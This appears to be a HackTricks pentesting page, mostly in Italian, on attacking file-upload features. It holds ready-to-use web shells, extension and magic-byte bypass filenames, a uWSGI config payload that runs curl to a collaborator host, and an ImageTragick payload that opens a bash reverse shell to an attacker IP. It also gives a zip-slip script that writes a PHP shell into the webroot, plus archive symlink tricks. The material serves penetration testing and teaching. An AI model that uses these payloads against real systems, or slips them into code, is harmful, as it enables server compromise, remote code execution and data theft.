# File Upload

{{#include ../../banners/hacktricks-training.md}}

## Metodologia generale per il File Upload

Altre estensioni utili:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass dei controlli sulle estensioni dei file

1. Se applicabile, **controlla** le **estensioni precedenti**. Testale anche usando qualche **maiuscola**: _pHp, .pHP5, .PhAr ..._
2. _Controlla **aggiungendo un'estensione valida prima** dell'estensione eseguibile (usa anche le estensioni precedenti):_
- _file.png.php_
- _file.png.Php5_
3. Prova ad aggiungere **caratteri speciali alla fine.** Puoi usare Burp per **bruteforceare** tutti i caratteri **ascii** e **Unicode**. (_Nota che puoi anche provare a usare le **estensioni** già menzionate_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Prova a bypassare le protezioni **ingannando il parser delle estensioni** lato server con tecniche come il **raddoppio** dell’**estensione** o **aggiungendo dati spazzatura** (byte **null**) tra le estensioni. _Puoi anche usare le **estensioni precedenti** per preparare un payload migliore._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Aggiungi **un altro livello di estensioni** al controllo precedente:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Prova a mettere l'**estensione eseguibile prima** dell'estensione valida e spera che il server sia mal configurato. (utile per sfruttare misconfigurazioni Apache dove qualsiasi cosa con estensione** _**.php**_**, ma** non necessariamente terminante in .php** eseguirà codice):
- _ex: file.php.png_
7. Uso degli **NTFS alternate data stream (ADS)** in **Windows**. In questo caso verrà inserito il carattere due punti ":" dopo un'estensione proibita e prima di una permessa. Di conseguenza verrà creato sul server un **file vuoto con l'estensione proibita** (es. "file.asax:.jpg”). Questo file potrebbe poi essere modificato usando altre tecniche come il short filename. Il pattern "**::$data**” può anche essere usato per creare file non vuoti. Pertanto, aggiungere un punto dopo questo pattern potrebbe essere utile per bypassare ulteriori restrizioni (es. "file.asp::$data.”)
8. Prova a superare i limiti sul nome file. L'estensione valida viene troncata. E il PHP maligno rimane. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Bypass di Content-Type, Magic Number, Compression & Resizing

- Bypass dei controlli sul **Content-Type** impostando il **valore** dell'header **Content-Type** su: _image/png_ , _text/plain , application/octet-stream_
1. Wordlist per Content-Type: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass del controllo del **magic number** aggiungendo all'inizio del file i **byte di una vera immagine** (confondi il comando _file_). Oppure inserisci la shell nei **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oppure potresti anche **inserire il payload direttamente** in un'immagine:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se viene applicata una **compressione** all'immagine, per esempio usando librerie PHP standard come [PHP-GD](https://www.php.net/manual/fr/book.image.php), le tecniche precedenti non saranno utili. Tuttavia, puoi usare il chunk **PLTE** [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La pagina web potrebbe anche **ridimensionare** l'**immagine**, usando per esempio le funzioni PHP-GD `imagecopyresized` o `imagecopyresampled`. Tuttavia, puoi usare il chunk **IDAT** [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Un'altra tecnica per creare un payload che **sopravvive a un ridimensionamento dell'immagine**, usando la funzione PHP-GD `thumbnailImage`. In alternativa, puoi usare il chunk **tEXt** [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravvive alla compressione**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Altri trucchi da controllare

- Trova una vulnerabilità che permetta di **rinominare** il file già caricato (per cambiare l'estensione).
- Trova una vulnerabilità di **Local File Inclusion** per eseguire il backdoor.
- **Possibili Information disclosure**:
1. Carica **più volte** (e **allo stesso tempo**) lo **stesso file** con lo **stesso nome**
2. Carica un file con il **nome** di un **file** o **cartella** che **esiste già**
3. Caricare un file con nome **"." , ".." o "…”**. Per esempio, in Apache su **Windows**, se l'applicazione salva i file caricati in "/www/uploads/" il filename "." creerà un file chiamato "uploads" in "/www/".
4. Carica un file che potrebbe non essere facilmente eliminabile come **"…:.jpg”** in **NTFS**. (Windows)
5. Carica un file in **Windows** con **caratteri non validi** come `|<>*?”` nel nome. (Windows)
6. Carica un file in **Windows** usando nomi **riservati** (**vietati**) come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Prova anche a **caricare un eseguibile** (.exe) o un **.html** (meno sospetto) che **eseguirà codice** se accidentalmente aperto dalla vittima.

### Trucchi speciali con le estensioni

Se stai cercando di caricare file su un **PHP server**, [dai un'occhiata al trucco **.htaccess** per eseguire codice](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se stai cercando di caricare file su un **ASP server**, [dai un'occhiata al trucco **.config** per eseguire codice](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i `.jar` per java, ma per php, e possono essere **usati come un file php** (eseguendoli con php, o includendoli dentro uno script...)

L'estensione `.inc` è a volte usata per file php che vengono soltanto **inclusi**, quindi, in alcuni casi, qualcuno potrebbe aver permesso che **questa estensione venga eseguita**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante il parsing del file di configurazione. Perché la configurazione venga attivata e parsata, il processo uWSGI deve essere riavviato (potenzialmente dopo un crash o a causa di un attacco Denial of Service) oppure il file deve essere impostato su auto-reload. La funzionalità di auto-reload, se abilitata, ricarica il file a intervalli specificati quando vengono rilevate modifiche.

È cruciale comprendere la natura permissiva del parsing del file di configurazione di uWSGI. Nello specifico, il payload discusso può essere inserito in un file binario (ad esempio un'immagine o un PDF), ampliando ulteriormente la portata della possibile exploitation.

## **wget File Upload/SSRF Trick**

In alcune occasioni potresti trovare che un server stia usando **`wget`** per **scaricare file** e puoi **indicare** l'**URL**. In questi casi, il codice potrebbe verificare che l'estensione dei file scaricati sia presente in una whitelist per assicurarsi che vengano scaricati solo file consentiti. Tuttavia, **questo controllo può essere bypassato.**\

La **lunghezza massima** di un **filename** in **linux** è **255**, tuttavia **wget** tronca i nomi di file a **236** caratteri. Puoi **scaricare un file chiamato "A"\*232+".php"+".gif"**, questo filename **bypasserà** il **controllo** (come in questo esempio **".gif"** è un'estensione **valida**) ma `wget` **rinominerà** il file in **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Nota che **un'altra opzione** a cui potresti pensare per bypassare questo controllo è far sì che il **server HTTP reindirizzi a un file diverso**, così l'URL iniziale bypasserà il controllo e poi wget scaricherà il file reindirizzato con il nuovo nome. Questo **non funzionerà** **a meno che** wget non sia usato con il **parametro** `--trust-server-names` perché **wget scaricherà la pagina reindirizzata con il nome del file indicato nell'URL originale**.

## Strumenti

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) è un tool potente progettato per assistere Pentesters e Bug Hunters nel testing dei meccanismi di file upload. Sfrutta varie tecniche di bug bounty per semplificare il processo di identificazione e sfruttamento delle vulnerabilità, garantendo valutazioni approfondite delle applicazioni web.

### Corruzione degli indici di upload con le stranezze di snprintf (storico)

Alcuni handler di upload legacy che usano `snprintf()` o simili per costruire array multi-file da un singolo upload possono essere ingannati nel forgiare la struttura `_FILES`. A causa di incoerenze e troncamenti nel comportamento di `snprintf()`, un singolo upload attentamente costruito può apparire come più file indicizzati lato server, confondendo la logica che assume una forma rigorosa (es. trattandolo come un upload multi-file e prendendo branch non sicuri). Pur essendo oggi di nicchia, questo pattern di “index corruption” riemerge occasionalmente in CTF e in codebase più vecchie.

## From File upload to other vulnerabilities

- Imposta **filename** su `../../../tmp/lol.png` e prova a ottenere un **path traversal**
- Imposta **filename** su `sleep(10)-- -.jpg` e potresti ottenere una **SQL injection**
- Imposta **filename** su `<svg onload=alert(document.domain)>` per ottenere una XSS
- Imposta **filename** su `; sleep 10;` per testare qualche command injection (altre [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Prova **diversi payload svg** da [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famosa vulnerabilità **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se puoi indicare al web server di recuperare un'immagine da un URL potresti provare ad abusare di una [SSRF](../ssrf-server-side-request-forgery/index.html). Se questa **image** verrà **salvata** in qualche sito **pubblico**, potresti anche indicare un URL da [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **rubare informazioni di ogni visitatore**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDF appositamente creati per XSS: la pagina seguente mostra come **inject PDF data to obtain JS execution** (se puoi uploadare PDF potresti preparare un PDF che eseguirà JS arbitrario seguendo le indicazioni fornite) — [../xss-cross-site-scripting/pdf-injection.md](../xss-cross-site-scripting/pdf-injection.md)
- Carica il \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content per verificare se il server ha un **antivirus**
- Verifica se esiste un **size limit** nel caricamento dei file

Ecco una top 10 delle cose che puoi ottenere caricando (da [qui](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Fai riferimento a [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) per altri filetypes.

## Zip/Tar File Automatically decompressed Upload

Se puoi uploadare uno ZIP che verrà decompresso all'interno del server, puoi fare 2 cose:

### Symlink

Carica un archivio contenente soft link verso altri file; poi, accedendo ai file decompressi accederai ai file linkati:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decomprimere in cartelle diverse

La creazione inattesa di file in directory durante la decompressione è un problema significativo. Nonostante l'ipotesi iniziale che questa configurazione potesse impedire OS-level command execution tramite upload di file malevoli, il supporto alla compressione gerarchica e le capacità di directory traversal del ZIP archive format possono essere sfruttati. Questo permette agli attaccanti di bypassare le restrizioni ed evadere le directory di upload sicure manipolando la funzionalità di decompressione dell'applicazione target.

Un exploit automatizzato per creare tali file è disponibile su [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utilità può essere usata come mostrato:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, il **symlink trick with evilarc** è un'opzione. Se l'obiettivo è mirare a un file come `/flag.txt`, dovrebbe essere creato un symlink a quel file nel tuo sistema. Questo garantisce che evilarc non incontri errori durante il suo funzionamento.

Di seguito un esempio di codice Python utilizzato per creare un zip file malevolo:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abuso della compressione per file spraying**

Per maggiori dettagli **consulta il post originale su**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creazione di una PHP Shell**: Il codice PHP viene scritto per eseguire comandi passati tramite la variabile `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vengono creati più file e viene assemblato un archivio zip contenente questi file.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modifica con un hex editor o vi**: I nomi dei file all'interno dello zip vengono modificati usando vi o un hex editor, cambiando "xxA" in "../" per attraversare le directory.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Carica questo contenuto con un'estensione immagine per sfruttare la vulnerabilità **(ImageMagick , 7.0.1-1)** (dall'[exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Incorporare una PHP shell nel chunk IDAT di un file PNG può bypassare efficacemente alcune operazioni di elaborazione delle immagini. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, essendo comunemente usate per ridimensionare e ricampionare le immagini, rispettivamente. La capacità della PHP shell incorporata di rimanere inalterata da queste operazioni è un vantaggio significativo per alcuni casi d'uso.

Un'esplorazione dettagliata di questa tecnica, inclusa la metodologia e le potenziali applicazioni, è fornita nel seguente articolo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione approfondita del processo e delle sue implicazioni.

Ulteriori informazioni in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

I Polyglot files fungono da strumento unico nella sicurezza informatica, agendo come camaleonti che possono validamente esistere in più formati di file contemporaneamente. Un esempio interessante è un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF sia come RAR archive. Questi file non si limitano a questa coppia; combinazioni come GIF e JS o PPT e JS sono anch'esse possibili.

L'utilità principale dei polyglot files risiede nella loro capacità di eludere misure di sicurezza che filtrano i file in base al tipo. Nella pratica comune di molte applicazioni si permette solo l'upload di certi tipi di file—come JPEG, GIF o DOC—per mitigare il rischio rappresentato da formati potenzialmente dannosi (es. JS, PHP o Phar). Tuttavia, un polyglot, conformandosi ai criteri strutturali di più tipi di file, può furtivamente aggirare queste restrizioni.

Nonostante la loro adattabilità, i polyglot incontrano limitazioni. Per esempio, mentre un polyglot potrebbe incarnare simultaneamente un file PHAR (PHp ARchive) e un JPEG, il successo del suo upload potrebbe dipendere dalle politiche sulle estensioni del sistema. Se il sistema è rigoroso sulle estensioni consentite, la mera dualità strutturale di un polyglot potrebbe non essere sufficiente a garantirne l'upload.

Ulteriori informazioni in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Come evitare il rilevamento del tipo di file caricando un file JSON valido anche se non consentito, falsificando un file PDF (tecniche da **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Finché i magic bytes `%PDF` sono nei primi 1024 byte è valido (vedi esempio nel post)
- **`pdflib` library**: Aggiungi un falso formato PDF all'interno di un campo del JSON in modo che la library lo interpreti come un PDF (vedi esempio nel post)
- **`file` binary**: Può leggere fino a 1048576 byte da un file. Crea un JSON più grande di tale soglia in modo che non riesca a parseare il contenuto come JSON e poi, all'interno del JSON, inserisci la parte iniziale di un vero PDF e lo considererà un PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
